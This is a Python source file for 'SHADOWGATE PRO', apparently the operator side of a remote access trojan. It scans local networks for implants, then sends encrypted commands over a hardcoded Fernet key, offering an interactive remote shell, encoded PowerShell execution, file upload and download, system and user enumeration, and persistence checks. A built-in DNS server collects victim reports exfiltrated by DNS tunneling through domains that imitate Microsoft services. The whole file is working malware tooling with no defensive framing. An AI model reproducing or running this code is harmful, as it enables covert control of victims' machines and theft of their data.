#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import json
import struct
import threading
from cryptography.fernet import Fernet
import pyfiglet
import netifaces
import time
import select
import base64
import random
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer


class DNSReportReceiver:
    def __init__(self):
        self.encryption_key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
        self.cipher = Fernet(self.encryption_key)
        self.received_ips = set()
        self.received_systems = []

    def decode_dns_data(self, encoded_data):
        """Decodificar datos de DNS tunneling"""
        try:
            padding = (8 - len(encoded_data) % 8) % 8
            encoded_data += '=' * padding
            encrypted_data = base64.b32decode(encoded_data.upper())
            decrypted_data = self.cipher.decrypt(encrypted_data)
            system_info = json.loads(decrypted_data.decode())
            return system_info
        except Exception as e:
            print(f"[!] Error decoding DNS data: {e}")
            return None


class DNSHandler:
    def __init__(self, receiver):
        self.receiver = receiver

    def handle_request(self, request, handler):
        domain = str(request.q.qname).rstrip('.')

        # Check for our DNS tunneling domains
        tunneling_domains = ['azure-update.com', 'windows-telemetry.com', 'microsoft-ocsp.net']
        if any(tunnel_domain in domain for tunnel_domain in tunneling_domains):
            subdomain = domain.split('.')[0]
            system_info = self.receiver.decode_dns_data(subdomain)

            if system_info:
                print(f"[+] DNS Report received from: {system_info.get('public_ip', 'Unknown')}")
                if system_info.get('public_ip') not in self.receiver.received_ips:
                    self.receiver.received_ips.add(system_info.get('public_ip'))
                    self.receiver.received_systems.append(system_info)

        # Always return a valid response
        reply = request.reply()
        reply.add_answer(RR(domain, rdata=A("127.0.0.1"), ttl=60))
        return reply


class AdvancedShadowGateController:
    def __init__(self):
        self.target_ip = None
        self.socket = None
        self.connected = False
        self.connection_persistent = False
        self.encryption_key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
        self.cipher = Fernet(self.encryption_key)
        self.dns_receiver = DNSReportReceiver()
        self.dns_server = None
        self.scan_timeout = 1
        self.command_timeout = 30
        self.reconnect_attempts = 3

    def scan_network_advanced(self, ports=[5560, 5555, 8080, 443]):
        """Advanced network scanning with multiple ports and techniques"""
        print("[*] Advanced network scanning in progress...")

        targets_found = []

        try:
            interfaces = netifaces.interfaces()

            for interface in interfaces:
                try:
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addrs:
                        for addr_info in addrs[netifaces.AF_INET]:
                            if 'addr' in addr_info and 'netmask' in addr_info:
                                ip = addr_info['addr']
                                netmask = addr_info['netmask']

                                network = self.calculate_network(ip, netmask)
                                if network:
                                    print(f"[*] Scanning network: {network}")
                                    targets = self.scan_network_range(network, ports)
                                    targets_found.extend(targets)
                except Exception as e:
                    print(f"[!] Interface error: {e}")
                    continue

            return list(set(targets_found))

        except Exception as e:
            print(f"[!] Advanced scan error: {e}")
            return self.scan_network_basic(ports)

    def scan_network_basic(self, ports=[5560]):
        """Basic network scanning fallback"""
        targets = []
        base_ip = "192.168.1."

        def scan_ip_port(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.scan_timeout)
                result = sock.connect_ex((ip, port))
                sock.close()

                if result == 0:
                    targets.append((ip, port))
                    print(f"[+] Target found: {ip}:{port}")
            except:
                pass

        threads = []
        for port in ports:
            for i in range(1, 255):
                ip = f"{base_ip}{i}"
                thread = threading.Thread(target=scan_ip_port, args=(ip, port))
                threads.append(thread)
                thread.start()

                if len(threads) >= 100:
                    for t in threads:
                        t.join()
                    threads = []

        for thread in threads:
            thread.join()

        return targets

    def calculate_network(self, ip, netmask):
        """Calculate network address from IP and mask"""
        try:
            ip_parts = list(map(int, ip.split('.')))
            mask_parts = list(map(int, netmask.split('.')))

            network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
            return '.'.join(map(str, network_parts)) + '.0/24'
        except:
            return None

    def scan_network_range(self, network_cidr, ports):
        """Scan specific network range"""
        targets = []
        base_ip = network_cidr.split('/')[0][:-2]

        def scan_ip_port(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.scan_timeout)
                result = sock.connect_ex((ip, port))
                sock.close()

                if result == 0:
                    targets.append((ip, port))
                    print(f"[+] Target: {ip}:{port}")
            except:
                pass

        threads = []
        for port in ports:
            for i in range(1, 255):
                ip = f"{base_ip}{i}"
                thread = threading.Thread(target=scan_ip_port, args=(ip, port))
                threads.append(thread)
                thread.start()

                if len(threads) >= 100:
                    for t in threads:
                        t.join()
                    threads = []

        for thread in threads:
            thread.join()

        return targets

    def smart_connect(self, target_info=None):
        """Smart connection with multiple strategies"""
        if target_info:
            ip, port = target_info
            return self.connect(ip, port)

        targets = self.scan_network_advanced()

        if not targets:
            print("[-] No targets found")
            return False

        for target in targets:
            ip, port = target
            if self.connect(ip, port):
                return True

        return False

    def connect(self, ip, port=5560):
        """Connect to target with improved error handling"""
        for attempt in range(self.reconnect_attempts):
            try:
                self.target_ip = ip
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                self.socket.connect((ip, port))
                self.connected = True
                self.connection_persistent = True

                print(f"[+] Connected to {ip}:{port}")

                self.start_keep_alive()
                return True

            except Exception as e:
                print(f"[-] Connection attempt {attempt + 1} failed: {e}")
                time.sleep(2)

        return False

    def start_keep_alive(self):
        """Keep connection alive"""

        def keep_alive():
            while self.connection_persistent and self.connected:
                try:
                    time.sleep(30)
                    if self.connected:
                        heartbeat = {'type': 'heartbeat', 'data': {'status': 'alive'}}
                        self.send_raw_command(heartbeat)
                except:
                    self.connected = False
                    break

        threading.Thread(target=keep_alive, daemon=True).start()

    def send_raw_command(self, command):
        """Send raw command without processing response"""
        if not self.connected:
            return False

        try:
            encrypted_cmd = self.cipher.encrypt(json.dumps(command).encode())
            self.socket.send(struct.pack('!I', len(encrypted_cmd)))
            self.socket.send(encrypted_cmd)
            return True
        except:
            self.connected = False
            return False

    def send_command(self, command_type, data=None, expect_response=True):
        """Send encrypted command with improved timeout"""
        if not self.connected:
            print("[-] Not connected. Use connect() first.")
            return None

        try:
            command = {
                'type': command_type,
                'data': data or {},
                'timestamp': time.time()
            }

            encrypted_cmd = self.cipher.encrypt(json.dumps(command).encode())

            self.socket.send(struct.pack('!I', len(encrypted_cmd)))
            self.socket.send(encrypted_cmd)

            if not expect_response:
                return {'success': True, 'message': 'Command sent without waiting for response'}

            ready = select.select([self.socket], [], [], self.command_timeout)
            if not ready[0]:
                print("[-] Timeout waiting for response")
                return {'success': False, 'error': 'Timeout waiting for response'}

            size_data = self.socket.recv(4)
            if not size_data:
                return {'success': False, 'error': 'No response size received'}

            size = struct.unpack('!I', size_data)[0]
            response_data = b''

            start_time = time.time()
            while len(response_data) < size:
                if time.time() - start_time > self.command_timeout:
                    print("[-] Timeout receiving data")
                    return {'success': False, 'error': 'Timeout receiving data'}

                chunk = self.socket.recv(min(4096, size - len(response_data)))
                if not chunk:
                    break
                response_data += chunk

            decrypted_response = self.cipher.decrypt(response_data)
            return json.loads(decrypted_response.decode())

        except Exception as e:
            print(f"[-] Error sending command: {e}")
            self.connected = False
            return {'success': False, 'error': f'Connection error: {str(e)}'}

    def execute_command(self, cmd, wait=True):
        """Execute command on target"""
        return self.send_command('system_command', {'command': cmd}, wait)

    def execute_powershell(self, script):
        """Execute PowerShell script"""
        encoded_script = base64.b64encode(script.encode('utf-16le')).decode()
        ps_command = f"powershell -EncodedCommand {encoded_script}"
        return self.execute_command(ps_command)

    def upload_file(self, local_path, remote_path):
        """Upload file to target"""
        try:
            with open(local_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()

            command = {
                'command': f'echo {file_data} | base64 -d > "{remote_path}"'
            }
            return self.send_command('system_command', command)
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def download_file(self, remote_path, local_path):
        """Download file from target"""
        try:
            result = self.execute_command(f'type "{remote_path}"')
            if result and result.get('success'):
                file_data = base64.b64decode(result['output'])
                with open(local_path, 'wb') as f:
                    f.write(file_data)
                return {'success': True}
            return result or {'success': False, 'error': 'No response from target'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def get_system_info(self):
        """Get detailed system information"""
        info_commands = {
            'systeminfo': 'systeminfo',
            'network': 'ipconfig /all',
            'processes': 'tasklist',
            'services': 'sc query',
            'users': 'net user',
            'drives': 'wmic logicaldisk get size,freespace,caption'
        }

        results = {}
        for name, cmd in info_commands.items():
            result = self.execute_command(cmd)
            if result and result.get('success'):
                results[name] = result['output']
            else:
                error_msg = result.get('error', 'Unknown error') if result else 'No response'
                results[name] = f"Error: {error_msg}"

        return results

    def file_explorer(self, path="C:\\"):
        """Advanced file explorer"""
        commands = {
            'list': f'dir "{path}"',
            'details': f'fsutil file layout "{path}"',
            'perms': f'icacls "{path}"'
        }

        results = {}
        for action, cmd in commands.items():
            result = self.execute_command(cmd)
            if result and result.get('success'):
                results[action] = result['output']
            else:
                error_msg = result.get('error', 'Unknown error') if result else 'No response'
                results[action] = f"Error: {error_msg}"

        return results

    def persistence_check(self):
        """Check persistence methods on target"""
        checks = {
            'registry': 'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'tasks': 'schtasks /query /fo list',
            'services': 'sc query',
            'startup': 'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
        }

        results = {}
        for name, cmd in checks.items():
            result = self.execute_command(cmd)
            if result and result.get('success'):
                results[name] = result['output']
            else:
                error_msg = result.get('error', 'Unknown error') if result else 'No response'
                results[name] = f"Error: {error_msg}"

        return results

    def remote_shell(self):
        """Interactive remote shell"""
        print("[*] Starting interactive remote shell...")
        print("    Type 'exit' to exit")

        while self.connected:
            try:
                cmd = input("remote-shell> ")

                if cmd.lower() in ['exit', 'quit']:
                    break

                if cmd.strip():
                    result = self.execute_command(cmd)
                    if result and result.get('success'):
                        print(result['output'])
                    elif result:
                        print(f"Error: {result.get('error', 'Unknown error')}")
                    else:
                        print("[-] No response from target")

            except KeyboardInterrupt:
                print("\n[*] Shell interrupted")
                break
            except Exception as e:
                print(f"[-] Shell error: {e}")
                break

    def show_banner(self):
        """Show improved banner"""
        banner = pyfiglet.figlet_format("SHADOWGATE PRO", font="slant")
        print(banner)
        print("Advanced Remote Control System")
        print("Persistent Connection | Advanced Commands | DNS Reporting")
        print("=" * 70)

    def start_dns_server(self):
        """Start DNS server for receiving reports"""
        if self.dns_server:
            print("[*] DNS server already running")
            return

        try:
            handler = DNSHandler(self.dns_receiver)
            self.dns_server = DNSServer(handler, port=53, address="0.0.0.0")

            def dns_server_thread():
                print("[+] Starting DNS server on port 53")
                self.dns_server.start()

            thread = threading.Thread(target=dns_server_thread, daemon=True)
            thread.start()
            print("[+] DNS server started successfully")

        except Exception as e:
            print(f"[-] Failed to start DNS server: {e}")
            print("[*] Try running with administrator privileges")

    def stop_dns_server(self):
        """Stop DNS server"""
        if self.dns_server:
            self.dns_server.stop()
            self.dns_server = None
            print("[+] DNS server stopped")

    def show_reported_systems(self):
        """Show systems that have reported via DNS"""
        if not self.dns_receiver.received_systems:
            print("[-] No systems have reported yet")
            return

        print("[+] Systems reporting via DNS:")
        for i, system in enumerate(self.dns_receiver.received_systems, 1):
            print(
                f"    {i}. {system.get('public_ip', 'Unknown')} - {system.get('username', 'Unknown')}@{system.get('hostname', 'Unknown')}")

    def interactive_menu(self):
        """Improved interactive menu"""
        self.show_banner()

        while True:
            print("\n" + "=" * 70)
            print("CONTROL MENU")
            print("=" * 70)

            if self.connected:
                status = "[+] CONNECTED"
                if self.connection_persistent:
                    status += " (PERSISTENT)"
                print(f"{status} to: {self.target_ip}")
            else:
                print("[-] NOT CONNECTED")

            print("\n[CONNECTION]")
            print("1. Scan and auto-connect")
            print("2. Connect to specific IP")
            print("3. Disconnect")

            print("\n[SYSTEM]")
            print("4. Complete system information")
            print("5. Advanced file explorer")
            print("6. Check persistence")

            print("\n[EXECUTION]")
            print("7. Interactive remote shell")
            print("8. Execute custom command")
            print("9. Execute PowerShell script")

            print("\n[FILES]")
            print("10. Upload file to target")
            print("11. Download file from target")

            print("\n[DNS REPORTING]")
            print("12. Start DNS server")
            print("13. Stop DNS server")
            print("14. View reported systems")
            print("15. Rescan for targets")

            print("\n[UTILITIES]")
            print("16. Test connection")
            print("0. Exit")
            print("=" * 70)

            choice = input("Select option: ").strip()

            if choice == "1":
                if self.smart_connect():
                    print("[+] Smart connection successful!")
                else:
                    print("[-] Could not connect")

            elif choice == "2":
                target = input("Target IP: ").strip()
                port = input("Port (5560): ").strip() or "5560"
                if target:
                    self.connect(target, int(port))

            elif choice == "3":
                self.disconnect()
                print("[+] Disconnected")

            elif choice == "4" and self.connected:
                print("[*] Gathering system information...")
                info = self.get_system_info()
                for section, content in info.items():
                    print(f"\n[{section.upper()}]")
                    print(content[:500] + "..." if len(content) > 500 else content)

            elif choice == "5" and self.connected:
                path = input("Path (e.g., C:\\Users): ").strip() or "C:\\"
                print(f"[*] Exploring: {path}")
                result = self.file_explorer(path)
                for action, output in result.items():
                    print(f"\n[{action}]")
                    print(output[:1000] + "..." if len(output) > 1000 else output)

            elif choice == "6" and self.connected:
                print("[*] Checking persistence...")
                persistence = self.persistence_check()
                for method, output in persistence.items():
                    print(f"\n[{method}]")
                    print(output[:1000] + "..." if len(output) > 1000 else output)

            elif choice == "7" and self.connected:
                self.remote_shell()

            elif choice == "8" and self.connected:
                cmd = input("Command to execute: ").strip()
                if cmd:
                    result = self.execute_command(cmd)
                    if result and result.get('success'):
                        print("[+] Command executed:")
                        print(result.get('output', ''))
                        if result.get('error'):
                            print("[!] Errors:")
                            print(result.get('error', ''))
                    else:
                        error_msg = result.get('error', 'Unknown error') if result else 'No response'
                        print(f"[-] Error executing command: {error_msg}")

            elif choice == "9" and self.connected:
                script = input("PowerShell script: ").strip()
                if script:
                    result = self.execute_powershell(script)
                    if result and result.get('success'):
                        print("[+] Script executed:")
                        print(result.get('output', ''))
                    else:
                        error_msg = result.get('error', 'Unknown error') if result else 'No response'
                        print(f"[-] Error executing script: {error_msg}")

            elif choice == "10" and self.connected:
                local = input("Local file path: ").strip()
                remote = input("Remote destination path: ").strip()
                if local and remote:
                    result = self.upload_file(local, remote)
                    if result and result.get('success'):
                        print("[+] File uploaded successfully")
                    else:
                        error_msg = result.get('error', 'Unknown error') if result else 'No response'
                        print(f"[-] Error uploading file: {error_msg}")

            elif choice == "11" and self.connected:
                remote = input("Remote file path: ").strip()
                local = input("Local destination path: ").strip()
                if remote and local:
                    result = self.download_file(remote, local)
                    if result and result.get('success'):
                        print("[+] File downloaded successfully")
                    else:
                        error_msg = result.get('error', 'Unknown error') if result else 'No response'
                        print(f"[-] Error downloading file: {error_msg}")

            elif choice == "12":
                self.start_dns_server()

            elif choice == "13":
                self.stop_dns_server()

            elif choice == "14":
                self.show_reported_systems()

            elif choice == "15":
                targets = self.scan_network_advanced()
                if targets:
                    print("[+] Targets found:")
                    for ip, port in targets:
                        print(f"    {ip}:{port}")
                else:
                    print("[-] No targets found")

            elif choice == "16" and self.connected:
                print("[*] Testing connection...")
                result = self.execute_command("echo Connection Test Successful")
                if result and result.get('success'):
                    print("[+] Connection working correctly")
                else:
                    error_msg = result.get('error', 'Unknown error') if result else 'No response'
                    print(f"[-] Connection problems: {error_msg}")

            elif choice == "0":
                self.disconnect()
                self.stop_dns_server()
                print("[+] Exiting...")
                break

            else:
                print("[-] Invalid option")

            if choice != "0":
                input("\nPress Enter to continue...")

    def disconnect(self):
        """Clean disconnect"""
        if self.connected:
            try:
                disconnect_cmd = {'type': 'disconnect', 'data': {}}
                self.send_raw_command(disconnect_cmd)
            except:
                pass
            finally:
                self.connection_persistent = False
                self.connected = False
                if self.socket:
                    self.socket.close()
                print("[+] Disconnected")

    def test_connection(self):
        """Improved automatic connection test"""
        print("[*] Starting advanced connection test...")

        if self.smart_connect():
            print("[+] Smart connection successful!")

            tests = [
                ("systeminfo", "System information"),
                ("whoami", "Current user"),
                ("hostname", "Computer name")
            ]

            for cmd, description in tests:
                print(f"[*] Testing: {description}...")
                result = self.execute_command(cmd)
                if result and result.get('success'):
                    print(f"[+] {description} working:")
                    print(result.get('output', '')[:200] + "...")
                else:
                    error_msg = result.get('error', 'Unknown error') if result else 'No response'
                    print(f"[-] Error in {description}: {error_msg}")

            self.disconnect()
        else:
            print("[-] Could not connect automatically")


def main():
    """Main function of the advanced controller"""
    controller = AdvancedShadowGateController()

    controller.show_banner()

    print("\n[startup options]:")
    print("1. Run automatic connection test")
    print("2. Enter interactive menu directly")
    print("3. Scan network only")
    print("4. Start DNS server only")

    choice = input("Select option: ").strip()

    if choice == "1":
        controller.test_connection()
        input("\nPress Enter to continue to menu...")
        controller.interactive_menu()
    elif choice == "2":
        controller.interactive_menu()
    elif choice == "3":
        targets = controller.scan_network_advanced()
        if targets:
            print("[+] Targets found:")
            for ip, port in targets:
                print(f"    {ip}:{port}")
        else:
            print("[-] No targets found")
    elif choice == "4":
        controller.start_dns_server()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            controller.stop_dns_server()
    else:
        print("[*] Starting interactive mode...")
        controller.interactive_menu()


if __name__ == "__main__":
    main()